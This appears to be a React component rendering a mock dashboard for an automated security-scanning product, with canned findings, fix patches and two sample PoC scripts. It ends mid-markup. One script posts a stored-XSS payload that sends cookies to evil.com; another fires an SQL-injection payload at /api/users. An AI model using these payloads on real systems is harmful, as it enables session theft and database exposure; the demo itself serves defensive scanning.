import { useEffect, useState, useCallback } from 'react';

function cx(...classes: Array<string | false | null | undefined>) {
  return classes.filter(Boolean).join(' ');
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------
type PhaseId = 1 | 2 | 3 | 4;
type Severity = 'Critical' | 'High' | 'Medium' | 'Low' | 'Info';
type FindingDetailTab = 'detail' | 'poc' | 'fix';

interface Phase {
  id: PhaseId;
  name: string;
  progress: number;
  elapsed: string;
}
interface Agent {
  name: string;
  phase: PhaseId;
  status: 'done' | 'running' | 'queued';
  findings: number;
  terminalLines: TerminalLine[];
}
interface Finding {
  id: string;
  title: string;
  severity: Severity;
  status: 'Confirmed' | 'Validating' | 'Pending';
  agent: string;
  phase: PhaseId;
  endpoint: string;
  cvss: number;
  parameter: string;
  impact: string;
  remediation: string;
  detail: TerminalLine[];
}
interface TerminalLine {
  prefix: string;
  text: string;
  dim: boolean;
}
interface PhaseStats {
  endpoints: number;
  params: number;
  tools: number;
  agents: number;
}

// ---------------------------------------------------------------------------
// Data
// ---------------------------------------------------------------------------
const phaseDefs: Phase[] = [
  { id: 1, name: 'Recon', progress: 25, elapsed: '1m 12s' },
  { id: 2, name: 'Analysis', progress: 50, elapsed: '2m 48s' },
  { id: 3, name: 'Exploitation', progress: 65, elapsed: '4m 32s' },
  { id: 4, name: 'Reporting', progress: 100, elapsed: '5m 47s' },
];

const phaseStats: Record<PhaseId, PhaseStats> = {
  1: { endpoints: 23, params: 156, tools: 3, agents: 1 },
  2: { endpoints: 23, params: 156, tools: 5, agents: 5 },
  3: { endpoints: 23, params: 156, tools: 7, agents: 9 },
  4: { endpoints: 23, params: 156, tools: 7, agents: 9 },
};

const phaseTerminal: Record<PhaseId, TerminalLine[]> = {
  1: [
    { prefix: '[recon]', text: 'Starting reconnaissance on api.example.com', dim: true },
    { prefix: '[recon]', text: 'subfinder: 47 subdomains discovered', dim: false },
    { prefix: '[recon]', text: 'httpx: 23 live endpoints mapped', dim: false },
    { prefix: '[recon]', text: 'katana: 156 parameters extracted', dim: false },
    { prefix: '[recon]', text: 'ffuf: 12 hidden paths found', dim: false },
    { prefix: '[recon]', text: 'Recon phase complete. Handing off to Analysis.', dim: true },
  ],
  2: [
    { prefix: '[analysis]', text: 'Spawning 5 analysis agents in parallel...', dim: true },
    { prefix: '[analysis]', text: 'InjectionAnalysis: 3 potential SQLi vectors', dim: false },
    { prefix: '[analysis]', text: 'XSSAnalysis: 2 reflected, 1 stored XSS', dim: false },
    { prefix: '[analysis]', text: 'AuthAnalysis: weak session token entropy', dim: false },
    { prefix: '[analysis]', text: 'SSRFAnalysis: open redirect in /proxy', dim: false },
    { prefix: '[analysis]', text: 'BusinessLogicAnalysis: no issues found', dim: true },
    { prefix: '[analysis]', text: 'Analysis complete. 7 candidates for exploitation.', dim: true },
  ],
  3: [
    { prefix: '[exploit]', text: 'Validating findings \u2014 no exploit, no report...', dim: true },
    { prefix: '[exploit]', text: 'InjectionExploit: confirmed SQLi on /api/users', dim: false },
    { prefix: '[exploit]', text: 'InjectionExploit: blind SQLi on /api/search', dim: false },
    { prefix: '[exploit]', text: 'XSSExploit: payload executed in DOM', dim: false },
    { prefix: '[exploit]', text: 'AuthExploit: IDOR confirmed on /api/orders/{id}', dim: false },
    { prefix: '[exploit]', text: 'Generating PoC scripts for confirmed vulns...', dim: true },
  ],
  4: [
    { prefix: '[report]', text: 'Aggregating confirmed findings from all agents', dim: true },
    { prefix: '[report]', text: 'Generating SARIF output...', dim: false },
    { prefix: '[report]', text: 'Generating executive summary...', dim: false },
    { prefix: '[report]', text: 'Generating remediation plan with fix patches...', dim: false },
    { prefix: '[report]', text: 'CVSS scoring: 1 Critical, 2 High, 2 Medium, 1 Low', dim: false },
    { prefix: '[report]', text: 'Report saved to ./sast-report-20260216.sarif', dim: true },
    { prefix: '[report]', text: 'Scan complete. 6 confirmed vulnerabilities.', dim: false },
  ],
};

const allAgents: Agent[] = [
  {
    name: 'ReconAgent', phase: 1, status: 'done', findings: 0,
    terminalLines: [
      { prefix: '[recon]', text: 'ReconAgent initializing...', dim: true },
      { prefix: '[recon]', text: 'Running subfinder on api.example.com', dim: false },
      { prefix: '[recon]', text: '47 subdomains discovered', dim: false },
      { prefix: '[recon]', text: 'Running httpx probe on live hosts', dim: false },
      { prefix: '[recon]', text: '23 live endpoints confirmed', dim: false },
      { prefix: '[recon]', text: 'Running katana crawler for parameters', dim: false },
      { prefix: '[recon]', text: '156 parameters extracted across 23 endpoints', dim: false },
    ],
  },
  {
    name: 'InjectionAnalysis', phase: 2, status: 'done', findings: 3,
    terminalLines: [
      { prefix: '[injection]', text: 'Analyzing 23 endpoints for injection vectors', dim: true },
      { prefix: '[injection]', text: 'Testing /api/users?id= for SQLi', dim: false },
      { prefix: '[injection]', text: 'FOUND: Error-based SQLi in id parameter', dim: false },
      { prefix: '[injection]', text: 'Testing /api/search?q= for SQLi', dim: false },
      { prefix: '[injection]', text: 'FOUND: Blind SQLi via time delay', dim: false },
      { prefix: '[injection]', text: 'FOUND: NoSQLi in /api/auth/login body', dim: false },
    ],
  },
  {
    name: 'XSSAnalysis', phase: 2, status: 'done', findings: 2,
    terminalLines: [
      { prefix: '[xss]', text: 'Scanning 156 parameters for XSS', dim: true },
      { prefix: '[xss]', text: 'Testing reflection in /search?q=', dim: false },
      { prefix: '[xss]', text: 'FOUND: Reflected XSS in search param', dim: false },
      { prefix: '[xss]', text: 'Testing /api/comments POST body', dim: false },
      { prefix: '[xss]', text: 'FOUND: Stored XSS in comment field', dim: false },
    ],
  },
  {
    name: 'AuthAnalysis', phase: 2, status: 'done', findings: 1,
    terminalLines: [
      { prefix: '[auth]', text: 'Analyzing authentication flow', dim: true },
      { prefix: '[auth]', text: 'Session token entropy: 48 bits (weak)', dim: false },
      { prefix: '[auth]', text: 'Testing IDOR on resource endpoints', dim: false },
      { prefix: '[auth]', text: 'FOUND: Missing rate limit on /login', dim: false },
    ],
  },
  {
    name: 'SSRFAnalysis', phase: 2, status: 'done', findings: 1,
    terminalLines: [
      { prefix: '[ssrf]', text: 'Testing server-side request vectors', dim: true },
      { prefix: '[ssrf]', text: 'Probing /api/proxy?url= endpoint', dim: false },
      { prefix: '[ssrf]', text: 'FOUND: SSRF via image proxy endpoint', dim: false },
      { prefix: '[ssrf]', text: 'Internal metadata reachable: 169.254.169.254', dim: false },
    ],
  },
  {
    name: 'BusinessLogicAnalysis', phase: 2, status: 'done', findings: 0,
    terminalLines: [
      { prefix: '[logic]', text: 'Analyzing business logic flows', dim: true },
      { prefix: '[logic]', text: 'Testing checkout flow for race conditions', dim: false },
      { prefix: '[logic]', text: 'Testing coupon stacking/reuse', dim: false },
      { prefix: '[logic]', text: 'No business logic vulnerabilities found', dim: true },
    ],
  },
  {
    name: 'InjectionExploit', phase: 3, status: 'running', findings: 2,
    terminalLines: [
      { prefix: '[exploit]', text: 'InjectionExploit: attempting exploitation', dim: true },
      { prefix: '[exploit]', text: "Payload: ' OR 1=1 -- on /api/users?id=", dim: false },
      { prefix: '[exploit]', text: 'CONFIRMED: full table dump achieved', dim: false },
      { prefix: '[exploit]', text: 'Generating PoC: exploit_sqli_users.py', dim: false },
      { prefix: '[exploit]', text: 'Blind SQLi: extracting via time delay', dim: false },
      { prefix: '[exploit]', text: 'CONFIRMED: blind SQLi on /api/search', dim: false },
    ],
  },
  {
    name: 'XSSExploit', phase: 3, status: 'running', findings: 1,
    terminalLines: [
      { prefix: '[exploit]', text: 'XSSExploit: launching Playwright browser', dim: true },
      { prefix: '[exploit]', text: 'Injecting <script>alert(1)</script>', dim: false },
      { prefix: '[exploit]', text: 'CONFIRMED: DOM execution, cookie exfil possible', dim: false },
      { prefix: '[exploit]', text: 'Screenshot captured: evidence/xss_001.png', dim: false },
      { prefix: '[exploit]', text: 'Validating stored XSS in /comments...', dim: false },
    ],
  },
  {
    name: 'AuthExploit', phase: 3, status: 'queued', findings: 0,
    terminalLines: [
      { prefix: '[exploit]', text: 'AuthExploit: queued, waiting for slot', dim: true },
      { prefix: '[exploit]', text: 'Will test IDOR on /api/orders/{id}', dim: true },
      { prefix: '[exploit]', text: 'Will test session fixation attack', dim: true },
    ],
  },
];

const allFindings: Finding[] = [
  {
    id: 'SAST-001', title: 'SQL Injection in /api/users', severity: 'Critical', status: 'Confirmed', agent: 'InjectionExploit', phase: 3,
    endpoint: 'GET /api/users?id=1', cvss: 9.8, parameter: 'id (query string)',
    impact: 'Full database read access \u2014 attacker can dump all user records, credentials, and PII.',
    remediation: 'Use parameterized queries (prepared statements). Never concatenate user input into SQL.',
    detail: [
      { prefix: '[detail]', text: 'SAST-001: SQL Injection in /api/users', dim: false },
      { prefix: '[detail]', text: 'Severity: Critical | CVSS: 9.8', dim: false },
      { prefix: '[detail]', text: 'Endpoint: GET /api/users?id=1', dim: false },
      { prefix: '[detail]', text: 'Parameter: id (query string)', dim: false },
      { prefix: '[detail]', text: "Payload: ' OR 1=1 --", dim: false },
      { prefix: '[detail]', text: 'Impact: Full database read access', dim: false },
      { prefix: '[poc]', text: 'PoC: exploit_sqli_users.py generated', dim: true },
      { prefix: '[fix]', text: 'Fix: Use parameterized queries', dim: true },
    ],
  },
  {
    id: 'SAST-002', title: 'Stored XSS in comment field', severity: 'High', status: 'Confirmed', agent: 'XSSExploit', phase: 3,
    endpoint: 'POST /api/comments', cvss: 8.1, parameter: 'body (JSON field)',
    impact: 'Session hijacking, phishing attacks, defacement. Affects all users who view the comment.',
    remediation: 'Sanitize HTML output with DOMPurify. Add Content-Security-Policy headers.',
    detail: [
      { prefix: '[detail]', text: 'SAST-002: Stored XSS in comment field', dim: false },
      { prefix: '[detail]', text: 'Severity: High | CVSS: 8.1', dim: false },
      { prefix: '[detail]', text: 'Endpoint: POST /api/comments', dim: false },
      { prefix: '[detail]', text: 'Parameter: body (JSON field)', dim: false },
      { prefix: '[detail]', text: 'Payload: <script>document.cookie</script>', dim: false },
      { prefix: '[detail]', text: 'Impact: Session hijacking, phishing', dim: false },
      { prefix: '[fix]', text: 'Fix: Sanitize HTML output, CSP headers', dim: true },
    ],
  },
  {
    id: 'SAST-003', title: 'IDOR on /api/orders/{id}', severity: 'High', status: 'Validating', agent: 'AuthExploit', phase: 3,
    endpoint: 'GET /api/orders/{id}', cvss: 7.5, parameter: 'id (path)',
    impact: "Unauthorized access to other users' order data including PII and payment info.",
    remediation: 'Implement server-side authorization checks. Verify the requesting user owns the resource.',
    detail: [
      { prefix: '[detail]', text: 'SAST-003: IDOR on /api/orders/{id}', dim: false },
      { prefix: '[detail]', text: 'Severity: High | CVSS: 7.5', dim: false },
      { prefix: '[detail]', text: 'Endpoint: GET /api/orders/{id}', dim: false },
      { prefix: '[detail]', text: 'Status: Awaiting exploit validation', dim: true },
      { prefix: '[detail]', text: 'AuthExploit agent queued...', dim: true },
    ],
  },
  {
    id: 'SAST-004', title: 'SSRF via image proxy endpoint', severity: 'Medium', status: 'Confirmed', agent: 'SSRFAnalysis', phase: 2,
    endpoint: 'GET /api/proxy?url=', cvss: 6.5, parameter: 'url (query string)',
    impact: 'Internal network exposure. Attacker can reach cloud metadata (169.254.169.254) and internal services.',
    remediation: 'Allowlist external URLs. Block RFC1918 and link-local addresses. Validate URL scheme.',
    detail: [
      { prefix: '[detail]', text: 'SAST-004: SSRF via image proxy', dim: false },
      { prefix: '[detail]', text: 'Severity: Medium | CVSS: 6.5', dim: false },
      { prefix: '[detail]', text: 'Endpoint: GET /api/proxy?url=', dim: false },
      { prefix: '[detail]', text: 'Reached: http://169.254.169.254/metadata', dim: false },
      { prefix: '[detail]', text: 'Impact: Internal network exposure', dim: false },
      { prefix: '[fix]', text: 'Fix: Allowlist external URLs, block RFC1918', dim: true },
    ],
  },
  {
    id: 'SAST-005', title: 'Reflected XSS in search param', severity: 'Medium', status: 'Validating', agent: 'XSSExploit', phase: 3,
    endpoint: 'GET /search?q=', cvss: 6.1, parameter: 'q (query string)',
    impact: "Reflected script execution in victim's browser. Can steal session tokens via crafted URL.",
    remediation: 'Encode output context-appropriately. Use CSP headers with nonce-based script allowlisting.',
    detail: [
      { prefix: '[detail]', text: 'SAST-005: Reflected XSS in search', dim: false },
      { prefix: '[detail]', text: 'Severity: Medium | CVSS: 6.1', dim: false },
      { prefix: '[detail]', text: 'Endpoint: GET /search?q=', dim: false },
      { prefix: '[detail]', text: 'Reflection context: inside <div>', dim: false },
      { prefix: '[detail]', text: 'Status: Playwright validation in progress', dim: true },
    ],
  },
  {
    id: 'SAST-006', title: 'Missing rate limit on /login', severity: 'Low', status: 'Confirmed', agent: 'AuthAnalysis', phase: 2,
    endpoint: 'POST /api/auth/login', cvss: 3.7, parameter: 'N/A',
    impact: 'Brute-force credential attacks. 1000 requests in 10s with no throttle detected.',
    remediation: 'Add rate limiting middleware. Implement account lockout after 5 failed attempts.',
    detail: [
      { prefix: '[detail]', text: 'SAST-006: Missing rate limit on /login', dim: false },
      { prefix: '[detail]', text: 'Severity: Low | CVSS: 3.7', dim: false },
      { prefix: '[detail]', text: 'Endpoint: POST /api/auth/login', dim: false },
      { prefix: '[detail]', text: '1000 requests in 10s \u2014 no throttle', dim: false },
      { prefix: '[detail]', text: 'Impact: Brute-force credential attacks', dim: false },
      { prefix: '[fix]', text: 'Fix: Add rate limiting middleware', dim: true },
    ],
  },
];

const severityColor: Record<string, string> = {
  Critical: 'bg-red-500/20 text-red-400 border-red-500/30',
  High: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
  Medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
  Low: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30',
  Info: 'bg-white/10 text-white/50 border-white/20',
};

const statusColor: Record<string, string> = {
  Confirmed: 'text-emerald-400',
  Validating: 'text-yellow-400',
  Pending: 'text-white/30',
};

const pocScripts: Record<string, string> = {
  'SAST-001': `#!/usr/bin/env python3
"""PoC: SQL Injection in /api/users \u2014 SAST-001"""
import requests

TARGET = "https://api.example.com"
ENDPOINT = "/api/users"

# Error-based SQLi payload
payload = "' OR 1=1 --"
r = requests.get(f"{TARGET}{ENDPOINT}", params={"id": payload})

if r.status_code == 200 and len(r.json()) > 1:
    print(f"[!] SQLi confirmed: {len(r.json())} records")
    for user in r.json()[:3]:
        print(f"    - {user.get('email', 'N/A')}")
else:
    print("[-] Payload did not trigger")`,
  'SAST-002': `#!/usr/bin/env python3
"""PoC: Stored XSS in comment field \u2014 SAST-002"""
import requests

TARGET = "https://api.example.com"

# Store XSS payload
payload = "<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>"
r = requests.post(f"{TARGET}/api/comments", json={"body": payload, "postId": 1})

if r.status_code == 201:
    cid = r.json().get("id")
    print(f"[!] Stored XSS injected: #{cid}")
else:
    print("[-] Injection failed")`,
};

const fixPatches: Record<string, string> = {
  'SAST-001': `--- a/src/routes/users.js
+++ b/src/routes/users.js
@@ -12,7 +12,7 @@
 router.get('/api/users', async (req, res) => {
   const { id } = req.query;
-  const result = await db.query(
-    \`SELECT * FROM users WHERE id = '\${id}'\`
-  );
+  const result = await db.query(
+    'SELECT * FROM users WHERE id = $1',
+    [id]
+  );
   res.json(result.rows);
 });`,
  'SAST-002': `--- a/src/routes/comments.js
+++ b/src/routes/comments.js
@@ -8,6 +8,7 @@
+const DOMPurify = require('isomorphic-dompurify');
+
 router.post('/api/comments', async (req, res) => {
-  const { body, postId } = req.body;
+  const { postId } = req.body;
+  const body = DOMPurify.sanitize(req.body.body);
   const result = await db.query(
     'INSERT INTO comments (body, post_id) ...',
     [body, postId]`,
};

// ---------------------------------------------------------------------------
// Sub-components
// ---------------------------------------------------------------------------
function FindingDetail({
  finding,
  detailTab,
  onTabChange,
}: {
  finding: Finding;
  detailTab: FindingDetailTab;
  onTabChange: (tab: FindingDetailTab) => void;
}) {
  const hasPoc = finding.id in pocScripts;
  const hasFix = finding.id in fixPatches;
  const tabs: { id: FindingDetailTab; label: string; available: boolean }[] = [
    { id: 'detail', label: 'Detail', available: true },
    { id: 'poc', label: 'PoC', available: hasPoc },
    { id: 'fix', label: 'Fix', available: hasFix },
  ];

  return (
    <div className="flex h-full flex-col">
      <div className="flex shrink-0 border-b border-white/[0.06]">
        {tabs
          .filter((t) => t.available)
          .map((tab) => (
            <button
              key={tab.id}
              onClick={() => onTabChange(tab.id)}
              type="button"
              className={cx(
                'cursor-pointer px-4 py-2 font-mono text-[11px] transition-colors',
                detailTab === tab.id
                  ? 'border-b border-[#c0444c] text-white/70'
                  : 'text-white/25 hover:text-white/40',
              )}
            >
              {tab.label}
            </button>
          ))}
      </div>

      <div className="min-h-0 flex-1 overflow-y-auto p-4">
        {detailTab === 'detail' && (
          <div className="space-y-3 font-mono text-[12px]">
            <div className="flex items-center gap-2">
              <span className={cx('rounded border px-2 py-0.5 text-[11px]', severityColor[finding.severity])}>
                {finding.severity}
              </span>
              <span className="text-white/30">CVSS</span>
              <span
                className={cx(
                  'font-bold',
                  finding.cvss >= 9
                    ? 'text-red-400'
                    : finding.cvss >= 7
                      ? 'text-orange-400'
                      : finding.cvss >= 4
                        ? 'text-yellow-400'
                        : 'text-emerald-400',
                )}
              >
                {finding.cvss}
              </span>
              <span className={cx('ml-auto text-[11px]', statusColor[finding.status])}>{finding.status}</span>
            </div>

            <div className="space-y-1.5 text-white/40">
              <div>
                <span className="text-white/20">endpoint </span>
                {finding.endpoint}
              </div>
              <div>
                <span className="text-white/20">param &nbsp;&nbsp;&nbsp;</span>
                {finding.parameter}
              </div>
              <div>
                <span className="text-white/20">agent &nbsp;&nbsp;&nbsp;</span>
                {finding.agent}
              </div>
            </div>

            <div className="border-t border-white/[0.06] pt-2">
              <span className="text-[11px] text-white/20">impact</span>
              <p className="mt-1 leading-relaxed text-white/50">{finding.impact}</p>
            </div>

            <div className="border-t border-white/[0.06] pt-2">
              <span className="text-[11px] text-[#d98a90]/80">remediation</span>
              <p className="mt-1 leading-relaxed text-[#d98a90]/70">{finding.remediation}</p>
            </div>
          </div>
        )}

        {detailTab === 'poc' && hasPoc && (
          <div className="font-mono text-[11px] leading-5">
            <div className="mb-2 text-[10px] text-white/20">exploit_{finding.id.toLowerCase()}.py</div>
            <pre className="whitespace-pre-wrap break-words text-white/50">{pocScripts[finding.id]}</pre>
          </div>
        )}

        {detailTab === 'fix' && hasFix && (
          <div className="font-mono text-[11px] leading-5">
            <div className="mb-2 text-[10px] text-white/20">unified diff</div>
            <pre className="whitespace-pre-wrap break-words">
              {fixPatches[finding.id].split('\n').map((line, i) => (
                <div
                  key={i}
                  className={cx(
                    line.startsWith('+') && !line.startsWith('+++')
                      ? 'text-emerald-400/70'
                      : line.startsWith('-') && !line.startsWith('---')
                        ? 'text-red-400/70'
                        : line.startsWith('@@')
                          ? 'text-white/25'
                          : 'text-white/40',
                  )}
                >
                  {line}
                </div>
              ))}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
}

function TerminalPanel({ lines, visibleCount }: { lines: TerminalLine[]; visibleCount: number }) {
  return (
    <div className="min-h-0 flex-1 overflow-y-auto p-3 font-mono text-[11px] leading-6 sm:p-4 sm:text-[13px] sm:leading-7">
      {lines.slice(0, visibleCount).map((line, i) => (
        <div
          key={`${line.prefix}-${i}`}
          className={cx(
            'transition-opacity duration-300',
            i === visibleCount - 1 && visibleCount < lines.length
              ? 'opacity-100'
              : line.dim
                ? 'opacity-40'
                : 'opacity-80',
          )}
        >
          <span className="text-white/30">{line.prefix} </span>
          <span
            className={cx(
              line.prefix === '[fix]'
                ? 'text-emerald-400/70'
                : line.prefix === '[poc]'
                  ? 'text-yellow-400/70'
                  : line.dim
                    ? 'text-white/40'
                    : 'text-white/70',
            )}
          >
            {line.text}
          </span>
        </div>
      ))}
      {visibleCount < lines.length && (
        <span className="ml-0.5 mt-1 inline-block h-4 w-2 animate-pulse bg-[#c0444c]/70" />
      )}
    </div>
  );
}

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------
export function AppShowcase() {
  const [activePhase, setActivePhase] = useState<PhaseId>(3);
  const [activeTab, setActiveTab] = useState<'agents' | 'findings'>('agents');
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [selectedFinding, setSelectedFinding] = useState<string | null>(null);
  const [terminalLines, setTerminalLines] = useState<TerminalLine[]>([]);
  const [visibleLines, setVisibleLines] = useState(0);
  const [scanStatus, setScanStatus] = useState<'scanning' | 'complete'>('scanning');
  const [detailTab, setDetailTab] = useState<FindingDetailTab>('detail');

  const getPhaseStatus = useCallback(
    (phaseId: PhaseId) => {
      if (phaseId < activePhase) return 'complete' as const;
      if (phaseId === activePhase) return activePhase === 4 ? ('complete' as const) : ('active' as const);
      return 'pending' as const;
    },
    [activePhase],
  );

  const visibleAgents = allAgents
    .filter((a) => a.phase <= activePhase)
    .map((a) => ({ ...a, status: a.phase < activePhase ? ('done' as const) : a.status }));

  const visibleFindings = allFindings.filter((f) => f.phase <= activePhase);
  const activeFinding = selectedFinding ? allFindings.find((f) => f.id === selectedFinding) : null;
  const currentPhase = phaseDefs.find((p) => p.id === activePhase)!;
  const currentStats = phaseStats[activePhase];

  const showTerminal = useCallback((lines: TerminalLine[]) => {
    setTerminalLines(lines);
    setVisibleLines(0);
  }, []);

  const handlePhaseClick = useCallback(
    (phaseId: PhaseId) => {
      setActivePhase(phaseId);
      setSelectedAgent(null);
      setSelectedFinding(null);
      setDetailTab('detail');
      setScanStatus(phaseId === 4 ? 'complete' : 'scanning');
      showTerminal(phaseTerminal[phaseId]);
    },
    [showTerminal],
  );

  const handleAgentClick = useCallback(
    (agent: Agent) => {
      if (selectedAgent === agent.name) {
        setSelectedAgent(null);
        showTerminal(phaseTerminal[activePhase]);
      } else {
        setSelectedAgent(agent.name);
        setSelectedFinding(null);
        setDetailTab('detail');
        showTerminal(agent.terminalLines);
      }
    },
    [selectedAgent, activePhase, showTerminal],
  );

  const handleFindingClick = useCallback(
    (finding: Finding) => {
      if (selectedFinding === finding.id) {
        setSelectedFinding(null);
        setDetailTab('detail');
        showTerminal(phaseTerminal[activePhase]);
      } else {
        setSelectedFinding(finding.id);
        setSelectedAgent(null);
        setDetailTab('detail');
        showTerminal(finding.detail);
      }
    },
    [selectedFinding, activePhase, showTerminal],
  );

  useEffect(() => {
    showTerminal(phaseTerminal[activePhase]);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (visibleLines >= terminalLines.length) return;
    const timer = setTimeout(() => setVisibleLines((prev) => prev + 1), 150);
    return () => clearTimeout(timer);
  }, [visibleLines, terminalLines.length]);

  const showFindingDetail = !!activeFinding;

  return (
    <div className="flex aspect-[3/4] w-full select-none flex-col overflow-hidden rounded-2xl border border-[#2f2226] bg-[#160f10] text-[11px] shadow-[0_40px_120px_rgba(0,0,0,0.55)] sm:aspect-[15/8] sm:text-xs">
      <div className="flex shrink-0 items-center justify-between border-b border-white/[0.06] px-5 py-3">
        <div className="flex items-center gap-3">
          <div className="flex gap-2">
            <div className="size-3 rounded-full bg-white/[0.12]" />
            <div className="size-3 rounded-full bg-white/[0.12]" />
            <div className="size-3 rounded-full bg-white/[0.12]" />
          </div>
          <span className="ml-4 font-mono text-xs tracking-wide text-white/30">swrmz &mdash; scan session</span>
        </div>
        <div className="hidden items-center gap-4 font-mono text-xs text-white/20 sm:flex">
          <span>target: api.example.com</span>
          <span className="h-3.5 w-px bg-white/[0.08]" />
          <span className="flex items-center gap-1.5">
            <span className={cx('size-2 rounded-full', scanStatus === 'scanning' ? 'animate-pulse bg-[#c0444c]' : 'bg-emerald-500')} />
            {scanStatus === 'scanning' ? 'scanning' : 'complete'}
          </span>
        </div>
      </div>

      <div className="flex min-h-0 flex-1">
        <div className="flex min-w-0 flex-1 flex-col border-r border-white/[0.06]">
          <div className="shrink-0 border-b border-white/[0.06] px-3 py-3 sm:px-5 sm:py-4">
            <div className="flex items-center gap-1.5">
              {phaseDefs.map((phase, i) => {
                const status = getPhaseStatus(phase.id);
                return (
                  <div key={phase.id} className="flex flex-1 items-center gap-1.5">
                    <button
                      onClick={() => handlePhaseClick(phase.id)}
                      type="button"
                      className={cx(
                        'flex w-full cursor-pointer items-center justify-center gap-1.5 rounded-lg px-2 py-1.5 font-mono text-[10px] transition-all duration-200 sm:gap-2 sm:px-3 sm:text-xs',
                        status === 'complete' && 'bg-white/[0.05] text-white/50 hover:bg-white/[0.08]',
                        status === 'active' && 'border border-[#c0444c]/30 bg-[#c0444c]/12 text-white hover:bg-[#c0444c]/20',
                        status === 'pending' && 'text-white/20 hover:bg-white/[0.03] hover:text-white/35',
                      )}
                    >
                      {status === 'complete' && (
                        <svg className="size-3.5 shrink-0 text-emerald-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      )}
                      {status === 'active' && <span className="size-2 shrink-0 animate-pulse rounded-full bg-[#c0444c]" />}
                      <span className="hidden sm:inline">{phase.name}</span>
                      <span className="sm:hidden">{phase.id}</span>
                    </button>
                    {i < phaseDefs.length - 1 && (
                      <svg className="size-3.5 shrink-0 text-white/[0.12]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
                      </svg>
                    )}
                  </div>
                );
              })}
            </div>
          </div>

          <div className="flex shrink-0 border-b border-white/[0.06]">
            <button
              onClick={() => {
                setActiveTab('agents');
                setSelectedFinding(null);
                setSelectedAgent(null);
                setDetailTab('detail');
                showTerminal(phaseTerminal[activePhase]);
              }}
              type="button"
              className={cx(
                'flex-1 cursor-pointer px-5 py-2.5 font-mono text-xs transition-colors',
                activeTab === 'agents' ? 'border-b-2 border-[#c0444c] text-white/70' : 'text-white/25 hover:text-white/40',
              )}
            >
              Agents ({visibleAgents.length})
            </button>
            <button
              onClick={() => {
                setActiveTab('findings');
                setSelectedAgent(null);
                setSelectedFinding(null);
                setDetailTab('detail');
                showTerminal(phaseTerminal[activePhase]);
              }}
              type="button"
              className={cx(
                'flex-1 cursor-pointer px-5 py-2.5 font-mono text-xs transition-colors',
                activeTab === 'findings' ? 'border-b-2 border-[#c0444c] text-white/70' : 'text-white/25 hover:text-white/40',
              )}
            >
              Findings ({visibleFindings.length})
            </button>
          </div>

          <div className="min-h-0 flex-1 overflow-y-auto">
            {activeTab === 'agents' ? (
              <div className="divide-y divide-white/[0.04]">
                {visibleAgents.map((agent) => (
                  <button
                    key={agent.name}
                    onClick={() => handleAgentClick(agent as Agent)}
                    type="button"
                    className={cx(
                      'flex w-full cursor-pointer items-center justify-between px-3 py-2.5 text-left transition-colors sm:px-5 sm:py-3',
                      selectedAgent === agent.name ? 'bg-white/[0.05]' : 'hover:bg-white/[0.02]',
                    )}
                  >
                    <div className="flex min-w-0 items-center gap-3">
                      <span
                        className={cx(
                          'size-2 shrink-0 rounded-full',
                          agent.status === 'done' && 'bg-emerald-500',
                          agent.status === 'running' && 'animate-pulse bg-[#c0444c]',
                          agent.status === 'queued' && 'bg-white/20',
                        )}
                      />
                      <span
                        className={cx(
                          'truncate font-mono text-[12px] transition-colors sm:text-[13px]',
                          selectedAgent === agent.name ? 'text-white/80' : 'text-white/60',
                        )}
                      >
                        {agent.name}
                      </span>
                    </div>
                    <div className="flex shrink-0 items-center gap-2">
                      {agent.findings > 0 && (
                        <span className="hidden font-mono text-xs text-white/25 sm:inline">{agent.findings} findings</span>
                      )}
                      <span
                        className={cx(
                          'min-w-[52px] text-right font-mono text-xs',
                          agent.status === 'done' && 'text-emerald-500/70',
                          agent.status === 'running' && 'text-white/40',
                          agent.status === 'queued' && 'text-white/15',
                        )}
                      >
                        {agent.status}
                      </span>
                    </div>
                  </button>
                ))}
              </div>
            ) : (
              <div className="divide-y divide-white/[0.04]">
                {visibleFindings.map((finding) => (
                  <button
                    key={finding.id}
                    onClick={() => handleFindingClick(finding)}
                    type="button"
                    className={cx(
                      'flex w-full cursor-pointer items-center justify-between px-3 py-2.5 text-left transition-colors sm:px-5 sm:py-3',
                      selectedFinding === finding.id ? 'bg-white/[0.05]' : 'hover:bg-white/[0.02]',
                    )}
                  >
                    <div className="flex min-w-0 items-center gap-3">
                      <span className="shrink-0 font-mono text-xs text-white/20">{finding.id}</span>
                      <span
                        className={cx(
                          'truncate font-mono text-[12px] transition-colors sm:text-[13px]',
                          selectedFinding === finding.id ? 'text-white/80' : 'text-white/60',
                        )}
                      >
                        {finding.title}
                      </span>
                    </div>
                    <div className="ml-3 flex shrink-0 items-center gap-2">
                      <span className={cx('font-mono text-[11px]', statusColor[finding.status])}>{finding.status}</span>
                      <span className={cx('rounded border px-2 py-0.5 font-mono text-[11px]', severityColor[finding.severity])}>
                        {finding.severity}
                      </span>
                    </div>
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>

        <div className="hidden w-[340px] shrink-0 flex-col lg:flex">
          <div className="shrink-0 border-b border-white/[0.06] px-5 py-2.5">
            <span className="font-mono text-xs text-white/25">
              {activeFinding ? `${activeFinding.id} \u2014 ${activeFinding.title}` : selectedAgent ? selectedAgent : 'live output'}
            </span>
          </div>
          {showFindingDetail ? (
            <FindingDetail finding={activeFinding!} detailTab={detailTab} onTabChange={setDetailTab} />
          ) : (
            <>
              <TerminalPanel lines={terminalLines} visibleCount={visibleLines} />
              <div className="flex shrink-0 items-center justify-between border-t border-white/[0.06] px-5 py-2.5">
                <div className="flex items-center gap-5 font-mono text-xs text-white/20">
                  <span>
                    endpoints: <span className="text-white/40">{currentStats.endpoints}</span>
                  </span>
                  <span>
                    params: <span className="text-white/40">{currentStats.params}</span>
                  </span>
                </div>
